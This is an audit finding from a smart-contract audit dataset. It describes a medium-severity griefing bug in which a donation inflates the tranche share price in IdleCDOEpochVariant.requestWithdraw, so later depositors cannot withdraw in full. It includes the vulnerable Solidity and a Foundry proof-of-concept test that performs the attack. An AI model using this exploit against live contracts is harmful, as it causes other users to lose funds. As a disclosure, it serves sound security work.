# [M] Users may not withdraw their funds

## Summary
Severity: Medium
Contest weight: 0.7589
Dataset id: 1951
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Malicious users can manipulate the tranche share's price. They can burn more strategy tokens than expected. This will cause other users cannot withdraw their funds.
In IdleCDOEpochVariant:requestWithdraw, users can request withdraw their funds. The withdraw underlying token amount will be calculated according to the current tranche share's price.
In function requestWithdraw(), we will burn the related strategy share according to the underlying token amount. The problem is that when we increase tranche share's price via donation, we can burn more strategy tokens than expected. This will cause left users cannot withdraw funds because the strategy share is not enough.
For example:
1. Empty market.
2. Alice deposits 2000 DAI.
3. Bob deposits 2000 DAI.
4. Pass one epoch.
5. Alice donates 3000 DAI.
6. Alice requests withdraw her tranche share(2000*1e18).
7. Alice will get back 3500 DAI. The left strategy share is around 500*1e18.
8. Bob can only get back around 500 DAI.
```solidity
function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256) {
    ...
    uint256 _underlyings = _amount * _tranchePrice(_tranche) / ONE_TRANCHE_TOKEN;
    ...
    creditVault.requestWithdraw(_underlyings, msg.sender, netInterest);
}
```
```solidity
function requestWithdraw(uint256 _amount, address _user, uint256 _netInterest) external {
    _onlyIdleCDO();
    _burn(msg.sender, _amount - _netInterest);
    _mint(_user, _amount);
    withdrawsRequests[_user] += _amount;
    pendingWithdraws += _amount;
    lastWithdrawRequest[_user] = epochNumber;
}
```
Internal Pre-conditions
N/A
External Pre-conditions
Empty market
Attack Path
1. Empty market.
2. Alice deposits 2000 DAI.
3. Bob deposits 2000 DAI.
4. Pass one epoch.
5. Alice donates 3000 DAI.
6. Alice requests withdraw her tranche share(2000*1e18).
7. Alice will get back 3500 DAI. The left strategy share is around 500*1e18.
8. Bob can only get back around 500 DAI.
In this attack vector, the attacker cannot earn some profits. But we still take this as one grief attack. Because of this grief attack, the Bob fails to withdraw his expected underlying token.
Users may fail to request withdraw, will lose their funds.

## Proof of Concept
```solidity
function testPocWithdrawDos() external {
    address alice = vm.addr(0x1);
    address bob = vm.addr(0x2);
    deal(defaultUnderlying, alice, 5000e18);
    deal(defaultUnderlying, bob, 2000e18);
    // Alice deposit 2000 DAI.
    vm.startPrank(alice);
    IERC20Detailed(defaultUnderlying).approve(address(idleCDO), type(uint256).max);
    idleCDO.depositAA(2000e18);
    vm.stopPrank();
    // Bob deposit 2000 DAI
    vm.startPrank(bob);
    IERC20Detailed(defaultUnderlying).approve(address(idleCDO), type(uint256).max);
    idleCDO.depositAA(2000e18);
    vm.stopPrank();
    vm.startPrank(manager);
    cdoEpoch.startEpoch();
    vm.stopPrank();
    vm.warp(cdoEpoch.epochEndDate() + 1);
    deal(defaultUnderlying, borrower, 10000e18);
    vm.startPrank(manager);
    cdoEpoch.stopEpoch(0, 1);
    vm.stopPrank();
    console.log("Contract value is: ", cdoEpoch.getContractValue());
    vm.startPrank(alice);
    IERC20Detailed(defaultUnderlying).transfer(address(cdoEpoch), 3000e18);
    cdoEpoch.requestWithdraw(2000e18, cdoEpoch.AATranche());
    uint256 beforeBalance = IERC20Detailed(defaultUnderlying).balanceOf(alice);
    cdoEpoch.claimWithdrawRequest();
    uint256 afterBalance = IERC20Detailed(defaultUnderlying).balanceOf(alice);
    console.log("Alice received amt: ", afterBalance - beforeBalance);
    address strategyToken = cdoEpoch.strategy();
    console.log("Left strategy token: ", IERC20Detailed(strategyToken).balanceOf(address(cdoEpoch)));
    vm.stopPrank();
    vm.startPrank(bob);
    cdoEpoch.requestWithdraw(2000e18, cdoEpoch.AATranche());
    beforeBalance = IERC20Detailed(defaultUnderlying).balanceOf(bob);
    cdoEpoch.claimWithdrawRequest();
    afterBalance = IERC20Detailed(defaultUnderlying).balanceOf(bob);
    console.log("Bob received amt: ", afterBalance - beforeBalance);
    strategyToken = cdoEpoch.strategy();
    console.log("Left strategy token: ", IERC20Detailed(strategyToken).balanceOf(address(cdoEpoch)));
    vm.stopPrank();
}
```

## Recommendation
No recommendation available
